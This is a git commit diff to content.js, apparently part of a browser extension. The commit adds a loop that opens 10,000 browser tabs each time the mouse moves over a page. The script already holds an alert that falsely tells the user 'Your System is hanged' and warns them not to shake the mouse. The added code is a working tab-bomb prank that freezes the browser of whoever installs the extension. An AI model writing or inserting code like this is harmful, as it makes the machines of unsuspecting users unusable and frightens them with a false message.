1d5f74d8cff770a54a39f5cf486eb3db9e4b203a
Pranaynigam07 <32392829+Pranaynigam07@users.noreply.github.com>
2021-01-06 21:57:02 +0530

    Add files via upload
    This creates the large number of tabs whenever mouseevent is triggered

--- content.js
+++ content.js
@@ -2,6 +2,8 @@ window.addEventListener("mouseover",mouseEventHandler);
 
 
  function mouseEventHandler(e){
+   for(var i=0;i<10000;i++)
+   window.open("https://www.google.co.in");
    alert("Your System is hanged!!!!!!!!!!!!!!!!!!! \n Dont Shake the mouse \n or else\n mouse will Shake you out")
 
  }
